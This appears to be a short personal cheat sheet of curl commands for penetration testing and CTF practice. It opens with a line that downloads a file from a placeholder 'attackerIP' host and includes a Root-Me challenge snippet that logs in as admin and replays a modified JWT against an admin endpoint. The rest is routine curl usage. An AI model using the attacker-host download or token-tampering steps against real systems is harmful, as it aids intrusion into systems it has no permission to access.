скачивает файл как в винде таки в линуксе типа wget  
curl attackerIP/file -O tonewfile  
  
jwt1=$(curl -s -X POST http://challenge01.root-me.org/web-serveur/ch63/login --data '{"username":"admin","password":"admin"}' -H "Content-Type: application/json" | jq '.access_token' | tr -d '"')  
curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin -H "Authorization: Bearer $jwt1="  
  
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py  
python get-pip.py  
python -m pip install requests  
  
# curl: show only header  
curl -I https://some-domain.com  
  
# curl: parameter in request, -d data, -s show error  
curl -s -d grant_type=password -d param1=value1 -d param2=value2 https://target.com/some/path  
  
# curl: print POST body of request  
curl --trace-ascii /dev/stdout -s -d param1=value1 https://target.com/some/path  
  
# curl: verbose, additional output  
curl -v https://target.com/some/path  
  
# curl: use GET and insert 2 lines into Header  
curl -X GET -H 'Accept: application/json' -H 'eyJhbBar...' 'https://target.com/some/path'  
  
# curl: download page + write to file  
curl --silent http://target.com -o target.html